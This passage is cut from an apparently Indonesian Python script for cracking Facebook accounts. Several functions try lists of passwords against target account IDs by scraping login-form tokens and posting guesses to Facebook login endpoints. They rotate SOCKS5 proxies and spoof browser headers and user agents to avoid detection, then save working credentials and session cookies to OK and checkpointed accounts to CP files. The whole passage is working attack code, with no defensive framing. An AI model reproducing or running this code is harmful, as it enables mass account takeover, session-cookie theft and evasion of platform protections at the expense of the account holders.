			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(" ")
				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{B}╰─{b}▶{b} SUCCES")
				print(f"{B}╰─{b}▶{b} {idf} ")
				print(f"{B}╰─{b}▶{b} {pw} ")
				print(f"{B}╰─{b}▶{b} {tahun(idf)} ")
				print(f"{B}╰─{b}▶{b} {kuki} ")
				print(f"{B}╰─{b}▶{b} {ua} ")
				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				os.popen("play-audio o.mp3")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(" ")
				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				print(f"{B}╰─{b}▶{B} CHECKPOINT")
				print(f"{B}╰─{b}▶{B} {idf} ")
				print(f"{B}╰─{b}▶{B} {pw} ")
				print(f"{B}╰─{b}▶{B} {tahun(idf)} ")
				print(f"{B}╰─{b}▶{B} {ua} ")
				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
				os.popen("play-audio c.mp3")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
 				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1	
	
	
#---------->> METHODE-MBASIC-REGULAR <<----------#
def crackemail(idf,pwv,nmf):
	global loop,ok,cp
	miw, asu = random.choice(["/","|","-"]), random.choice([M,K,H,U,B])
	prog.update(des,description=f" {K2}•{H2} CRACKEMAIL {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	ua = random.choice(ugent)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.latest.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Fm.latest.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.latest.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Windows"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Fm.latest.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{P}[{M}CP{P}] {K}{idf}|{pw}")
				os.popen("play-audio o.mp3")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}[{B}OK{P}] {H}{idf}|{pw}\n")
				print(f"\r{K}{kuki}|{ua}")
				os.popen("play-audio o.mp3")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------->> METHODE-MPROD-ASYNC <<----------#
def vipernew(idf,pwv,url):
    global loop,ok,cp
    rr = random.randint
    viperid = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
    prog.update(des,description=f" {K2}•{H2} VALIDATE V1 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua = random.choice(ngentott)
    ua = random.choice(ugent)
    ses = requests.Session()
    for pw in pwv:
        pw = pw.lower()
        try:
            if "ya" in ualuh:ua = ualu[0]
            viperlink = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
            date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(viperlink.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(viperlink.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(viperlink.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(viperlink.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(viperlink.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
            head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(viperlink.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": viperid}
            hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio c.mp3")
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                akun.append(idf + "|" + pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio o.mp3")
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break
            else:continue
        except requests.exceptions.ConnectionError:time.sleep(31)
    loop+=1
	
def crackprod(idf,pwv):
    global loop,ok,cp
    prog.update(des,description=f" {K2}•{H2} VALIDATE V2 🔥 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua = random.choice(prem)
    
    ses = requests.Session()
    for pw in pwv:
        try:
            if "ya" in ualuh:ua = ualu[0]
            link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            data = {
                'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
                'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
                'try_number': 0,
                'unrecognized_tries': 0,
                'email':idf,
                'pass':pw,
                'login':'Masuk',
                'prefill_contact_point': '',
                'prefill_source': '',
                'prefill_type': '',
                'first_prefill_source': '',
                'first_prefill_type': '',
                'had_cp_prefilled': False,
                'had_password_prefilled': False,
                'is_smart_lock': False,
                'bi_xrwh': 0
                }
            headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio c.mp3")
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                akun.append(idf + "|" + pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio o.mp3")
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1


def crackbasi(idf,pwv):
    global loop,ok,cp
    prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua = random.choice(ngentott)
    ua = random.choice(ugent)
    ses = requests.Session()
    for pw in pwv:
        try:
            if "ya" in ualuh:ua = ualu[0]
            link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
